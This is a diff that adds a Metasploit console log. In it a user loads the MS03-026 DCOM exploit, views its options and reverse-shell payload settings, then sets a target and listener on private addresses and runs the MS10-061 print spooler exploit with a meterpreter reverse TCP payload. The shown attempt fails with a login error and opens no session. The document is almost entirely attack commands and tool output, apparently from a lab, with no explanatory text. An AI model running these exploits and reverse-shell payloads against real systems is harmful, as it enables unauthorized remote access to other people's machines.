@@ -1,0 +1,58 @@
+msf6 > use exploit/windows/dcerpc/ms03_026_dcom
+[*] Using configured payload windows/shell/reverse_tcp
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > show options
+
+Module options (exploit/windows/dcerpc/ms03_026_dcom):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   135              yes       The target port (TCP)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows NT SP3-6a/2000/XP/2003 Universal
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/dcerpc/ms03_026_dcom) > back
+msf6 > use exploit/windows/smb/ms10_061_spoolss
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms10_061_spoolss) > set RHOSTS 10.0.2.4
+RHOSTS => 10.0.2.4
+msf6 exploit(windows/smb/ms10_061_spoolss) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(windows/smb/ms10_061_spoolss) > run
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[-] 10.0.2.4:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: Connection reset by peer
+[*] Exploit completed, but no session was created.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
